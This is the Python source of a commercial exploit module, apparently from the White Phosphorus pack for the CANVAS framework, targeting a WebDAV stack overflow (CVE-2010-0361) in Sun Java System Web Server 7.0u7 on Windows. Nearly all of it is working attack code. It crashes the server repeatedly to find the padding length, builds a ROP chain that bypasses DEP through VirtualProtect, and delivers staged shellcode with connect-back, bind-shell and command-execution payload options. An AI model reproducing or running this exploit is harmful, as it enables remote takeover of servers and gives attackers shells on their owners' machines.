
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
import urllib
import binascii
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Sun Java System Web Server v7.0u7 Webdav Remote Overflow"
DESCRIPTION = "Exploits a remote stack overflow in the Sun Java System Web Server"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Oracle'
DOCUMENTATION["Date public"] = "2010-01-20"    
DOCUMENTATION["Repeatability"] = "Multiple"
DOCUMENTATION['CVE Name']="CVE-2010-0361"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0361'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"] = """http://intevydis.blogspot.com/2010/01/sun-java-system-web-server-70u7-webdav.html
http://www.exploit-db.com/exploits/14287/"""
DOCUMENTATION["Notes"] = """
Exploit requires a valid webdav enabled path. The exploit also needs to determine a valid padding length, which is achieved through a brute force approach. Once the webserver crashes, and the valid padding is found, the watchdog process will restart the webserver and the exploit will continute.

Note that only the TCP Connect back will work against Windows 2008 targets.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "2000", "Vista", "7"]

NOTES="""
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Autoversioning
1: Windows 2003 SP1-SP2
2: Windows XP SP2-SP3
3: Windows Other (Non DEP)

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command
6: Socket Reuse

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_example_exploit/wp_example_exploit.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 80
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000, 0x00000000, 0x0000), []],
    1 : ["Windows Universal DEP", (0x00000000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows Other (Non DEP)", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command",
              "Socket Reuse"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x01\x0a\x0d\x20\x3a\x3b\x2f\x5c\x7e"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.suspendThreads = True
        self.path = "/"
        self.padding = 0
        return

    def usage(self):
        self.wp_usage(targets,"-O padding:<#>\t    (padding to use)\n-O path:<path>\t    (webdav path)")
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_bannerchecktest(self,self.host,self.port,{"Sun-Java-System-Web-Server/7.0": 1},1000,"HEAD / HTTP/1.0\r\n\r\n")

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        # cmd line options
        if self.argsDict.get("padding",'') != '':
            self.padding =int(self.argsDict.get("padding",''))
        if self.argsDict.get("path",'') != '':
            self.path =self.argsDict.get("path",'/')
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def wp_UniversalDEPBypassSJSWS(self, size=2200):
        size = size + 72
                
        self.log("WP> Building Universal DEP bypass using VirtualProtect")
        depBypass = ""
        
        depBypass += urllib.quote(pack('<L', 0x6DC0A63E)) # PUSH ESP / POP ESI / RET
        depBypass += urllib.quote(pack('<L', 0x6DB63587)) # MOV EAX, ESI / POP ESI / RET
        depBypass += urllib.quote(pack('<L', 0x61616161)) #
        depBypass += urllib.quote(pack('<L', 0x6DE6F305)) # ADD EAX, 20
        depBypass += urllib.quote(pack('<L', 0x6DE6F305)) # ADD EAX, 20
        depBypass += urllib.quote(pack('<L', 0x6DE6F305)) # ADD EAX, 20 
        depBypass += urllib.quote(pack('<L', 0x6DE51561)) # ADD EAX, 10
        depBypass += urllib.quote(pack('<L', 0x6DC4B289)) # XCHG EAX, EDI / RET
        depBypass += urllib.quote(pack('<L', 0x6DC0A63E)) # PUSH ESP / POP ESI / RET
        depBypass += urllib.quote(pack('<L', 0x6DB63587)) # MOV EAX, ESI / POP ESI / RET
        depBypass += urllib.quote(pack('<L', 0x61616161)) #
        depBypass += urllib.quote(pack('<L', 0x6DE46281)) # STOSD
        depBypass += urllib.quote(pack('<L', 0x6DE36364)) # POP EAX / RET
        depBypass += urllib.quote(pack('<L', 0x22222222))
        depBypass += urllib.quote(pack('<L', 0x6DCC8ABA)) # POP ECX / RET
        
        size = 0x22222222 - size              # This is the size calculation
        while hasbadchar(size,self.badstring):
            size -= 1
        
        depBypass += urllib.quote(pack('<L', size & 0xffffffff)) # Our ESI Adjustment for size
        depBypass += urllib.quote(pack('<L', 0x6DC54383))        # SUB EAX, ECX / RET
        depBypass += urllib.quote(pack('<L', 0x6DE46281))        # STOSD
        depBypass += urllib.quote(pack('<L', 0x6DB7D2D3))        # XOR EAX, EAX
        depBypass += urllib.quote(pack('<L', 0x6DE6B82D))        # ADD EAX, 40 / POP EBP / RET
        depBypass += urllib.quote(pack('<L', 0x61616161))        #
        depBypass += urllib.quote(pack('<L', 0x6DE46281))        # STOSD
        depBypass += urllib.quote(pack('<L', 0x6DE36364))        # POP EAX / RET
        depBypass += urllib.quote(pack('<L', 0x6DF17D88))        # writeable addr
        depBypass += urllib.quote(pack('<L', 0x6DE46281))        # STOSD
        depBypass += urllib.quote(pack('<L', 0x6DC4B289))        # XCHG EAX, EDI / RET
        depBypass += urllib.quote(pack('<L', 0x6DBE6665))        # XCHG EAX, EBP / RET
        depBypass += urllib.quote(pack('<L', 0x6DB98994))        # RETN
        depBypass += urllib.quote(pack('<L', 0x6DDC5968))        # Call VirtualProtect
        depBypass += urllib.quote(pack('<L', 0x61616161))*5      # write params here
        depBypass += urllib.quote(pack('<L', 0x6DB9FEB2))        # PUSH ESP / RETN
        
        self.depBypass_size = len(depBypass) 
        self.log("WP> Universal DEP Bypass Size: %d Bytes" % self.depBypass_size)
        return depBypass

    def makesploit(self,paddinglength):
        alignstack = "\xB8\xF4\xFF\xFF\xFF\x21\xC4" # MOV EAX,-0C, AND ESP,EAX        
         
        if self.version == 1:
            searchcode = wp_SearchCode2k8Heap(True)        
        else:
            searchcode = wp_SearchCode2k8Heap(False)
            
        self.log ("Search code size: %d"%len(searchcode))            
        #encode it
        searchcode = self.wp_encodeShellcode(self.badstring,searchcode )
               
        payload = "OPTIONS " + self.path 
                
        payload += "\x58" * paddinglength
        
        # Move along now
        payload += urllib.quote(pack('<L', 0x6D8610A7))*2 # POP / POP / POP / POP / POP / POP / RETN - verify.dll
        payload += "B"*12
        payload += urllib.quote(pack('<L', 0x6DF17D80))
        payload += urllib.quote(pack('<L', 0x6DF17D84))
        
        if self.version == 1:
            payload += self.wp_UniversalDEPBypassSJSWS(len(searchcode)+8)
            payload += "".join(["%%%02x" % ord(i) for i in searchcode])
        else:
            payload += urllib.quote(pack('<L', 0x6DD11133)) # JMP ESP - jvm.dll
            payload += "".join(["%%%02x" % ord(i) for i in searchcode])

        payload += " HTTP/1.0\r\n\r\n"
        
        
        return payload
        
    def makestage1(self):
        tag = "c00kc00k"
        alignstack = wp_AlignStack()

        sc = self.shellcode + "A"*100 
        
        data = tag
        
        if self.version == 1:
            data += urllib.unquote(self.wp_UniversalDEPBypassSJSWS(len(self.shellcode)+8))
                    
        # Align the stack
        data += alignstack
        
        data += sc
        
        stage1 = "POST / HTTP/1.0\r\n"
        stage1 += "Content-Length: %d\r\n\r\n"%len(data)
        stage1 += data
        
        return stage1        
   
    def triggercrash(self):
        # used to find the correct length, the watchdog will restart the service upon crash
        self.log("WP> Discovering padding length")

        length = 1
        while (length < 256):
            
            self.log("WP> Trying: %d"%length)
            payload = "OPTIONS " + self.path 
            
            # Need to find trigger
            payload += "\x58" * length
        
            payload += " HTTP/1.0\r\n\r\n"
            try:
                s = self.gettcpsock()
                s.connect((self.host, self.port))
                s.sendall(payload)
            except:
                self.log("WP> Couldn't connect to port")  
                return 0
                
            try:
                data = s.recv(512)
            except:
                s.close()
                self.log("WP> Using padding length: %d"%(length+1))            
                self.log("WP> Waiting 60 seconds for watchdog to restart service")
                time.sleep(60)
                while (wp_isPortOpen(self,self.host,self.port)) == 0:
                    time.sleep(2)
                self.log("WP> Service responding")
                time.sleep(2)
                return (length+1)
                                         
            #print data
            
            s.close()
            length=length+1
            
        self.log("WP> Failed to find padding length: %d"%length)            
        return 0        

    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        if not self.path.startswith("/"):
            self.path = "/" + self.path
        if not self.path.endswith("/"):
            self.path += "/"
            
#114 196   
#113 189                 
        
        if (self.padding==0):
            # Run the auto check
            self.padding = self.triggercrash()
            
        # Check port is open?
        if (wp_isPortOpen(self,self.host,self.port)) == 0:            
            self.padding =0
            
        self.log("WP> Targetting path: %s"%self.path)
        self.log("WP> Using padding: %d"%self.padding)
        
        if (self.padding > 0):
            payload = self.makesploit(self.padding)
            stage1 = self.makestage1()
            
            self.result_error = 0
            
            try:
                s = self.gettcpsock()
                s.connect((self.host, self.port))
                
                self.log("WP> Sending Exploit: Stage 1")
                s.sendall(stage1)
                
                # print s.recv(512)
                
                time.sleep(3)
                # sys.exit(0)
                s.close()
            except:
                self.log("WP> Attack reported no open socket - service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            
            
            
            try:
                s = self.gettcpsock()
                s.connect((self.host, self.port))
    
                self.log("WP> Sending Exploit: Stage 2")
                s.sendall(payload)
                
                time.sleep(4)
    
                if getattr(self, 'shell_REUSESOCKET',False) == False:
                    s.close()
            except:
                self.log("WP> Attack reported no open socket - service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            
            self.log("WP> Sent - Payload may take a moment to execute.")
            time.sleep(5)
            
            # Check if follow up is required for some shellcodes
            if self.result_error==0:
                ret = self.wp_postExploitShellcode(s)
                if ret:
                    return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
